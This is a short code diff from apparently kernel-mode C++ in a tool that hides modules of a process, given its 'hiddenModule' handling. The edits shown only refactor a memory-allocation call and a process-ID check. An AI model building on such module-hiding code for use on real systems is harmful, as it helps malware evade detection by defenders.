@@ -5,7 +5,7 @@
 
 ModuleParser::ModuleParser() {
 	this->optionsSize = 1;
-	this->options = (OptionMetadata*)AllocateMemory(this->optionsSize * sizeof(OptionMetadata));
+	this->options = AllocateMemory<OptionMetadata*>(this->optionsSize * sizeof(OptionMetadata));
 
 	if (!this->options)
 		ExRaiseStatus(STATUS_INSUFFICIENT_RESOURCES);
@@ -35,7 +35,7 @@ NTSTATUS ModuleParser::Execute(Options commandId, PVOID args[MAX_ARGS]) {
 
 	hiddenModule.Pid = *(ULONG*)args[0];
 
-	if (!VALID_PROCESS(hiddenModule.Pid))
+	if (!IsValidPid(hiddenModule.Pid))
 		return STATUS_INVALID_PARAMETER;
 
 	// Converting string to unicode.
